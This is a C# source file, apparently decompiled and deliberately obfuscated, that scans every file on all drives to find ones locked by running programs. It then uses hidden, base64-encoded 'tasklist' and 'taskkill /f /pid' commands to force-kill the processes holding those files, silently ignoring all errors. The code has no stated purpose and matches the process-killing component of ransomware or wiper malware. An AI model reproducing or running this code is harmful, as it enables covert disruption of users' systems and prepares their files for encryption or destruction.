using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;

namespace ALzLGBAFaCqNDAE;

internal class wFOcxFWrvvhtV
{
	[CompilerGenerated]
	private sealed class GBkcAfOLaEBrMLn
	{
		public string TxzKfsIJeHUwGX;

		public bool _003CKillproc_003Eb__4(string t)
		{
			return t.Contains(TxzKfsIJeHUwGX);
		}
	}

	public static readonly List<string> heOjRgwzlb = new List<string>();

	public static readonly List<string> gHRdyBOemoll = new List<string>();

	public static void CCZEtaSrmiBXIv()
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				if (driveInfo.IsReady)
				{
					hnWSaVGvoUnpz(driveInfo.Name);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public static void hnWSaVGvoUnpz(string hzTSoIEbSABQpq)
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(hzTSoIEbSABQpq);
			FileInfo[] files = directoryInfo.GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				try
				{
					heOjRgwzlb.Add(fileInfo.FullName);
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				try
				{
					hnWSaVGvoUnpz(directoryInfo2.FullName);
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
		}
		catch
		{
		}
		if (heOjRgwzlb.Count <= 0)
		{
			return;
		}
		foreach (string item in heOjRgwzlb.Where((string dzyxpFIMeAufz) => HfQhZOaQmZ(dzyxpFIMeAufz)))
		{
			gHRdyBOemoll.Add(item);
		}
		heOjRgwzlb.Clear();
		if (gHRdyBOemoll.Count <= 0)
		{
			return;
		}
		foreach (FileInfo item2 in gHRdyBOemoll.Select((string TLPmmPZeNKWrF) => new FileInfo(TLPmmPZeNKWrF)))
		{
			DqAiciqTVTQ(item2.Name);
		}
	}

	public static bool HfQhZOaQmZ(string bOwOHhtwqVnZ)
	{
		FileStream fileStream = null;
		try
		{
			fileStream = File.Open(bOwOHhtwqVnZ, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
		}
		catch (UnauthorizedAccessException)
		{
			try
			{
				fileStream = File.Open(bOwOHhtwqVnZ, FileMode.Open, FileAccess.Read, FileShare.None);
			}
			catch (Exception)
			{
				return true;
			}
		}
		catch (Exception)
		{
			return true;
		}
		finally
		{
			fileStream.Close();
		}
		return false;
	}

	public static void DqAiciqTVTQ(string nnVJPrIVwxMG)
	{
		try
		{
			string text = lWhYfHAfDNaMNa(RMvUnHFCuFhAD.tRvIdsqgaYol("dGFza2xpc3Q="), RMvUnHFCuFhAD.tRvIdsqgaYol("L3YgL2ZvIGNzdg=="));
			string[] separator = new string[1] { "\r\n" };
			string[] source = text.Split(separator, StringSplitOptions.None);
			List<string> list = (from t in source
				where t.Contains(nnVJPrIVwxMG)
				select t into yShDkhjsOgJ
				select yShDkhjsOgJ.Split(new char[1] { ',' }) into hEgDKJzpiWunf
				select hEgDKJzpiWunf[1].Replace("\"", "")).ToList();
			foreach (string item in list)
			{
				lWhYfHAfDNaMNa(RMvUnHFCuFhAD.tRvIdsqgaYol("dGFza2tpbGw="), RMvUnHFCuFhAD.tRvIdsqgaYol("L2YgL3BpZCA=") + item);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string lWhYfHAfDNaMNa(string VzQxLBOyXNrbr, string mHmpNDYhrmEL)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo(VzQxLBOyXNrbr, mHmpNDYhrmEL);
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.RedirectStandardError = true;
			processStartInfo.StandardOutputEncoding = Encoding.GetEncoding("UTF-8");
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			Process process = Process.Start(processStartInfo);
			string text;
			using (StreamReader streamReader = process.StandardOutput)
			{
				text = streamReader.ReadToEnd();
			}
			string text2;
			using (StreamReader streamReader2 = process.StandardError)
			{
				text2 = streamReader2.ReadToEnd();
			}
			process.WaitForExit();
			return text2 + text;
		}
		catch (Exception ex)
		{
			return ex.Message + "\n<------------>\n" + ex.StackTrace;
		}
	}
}
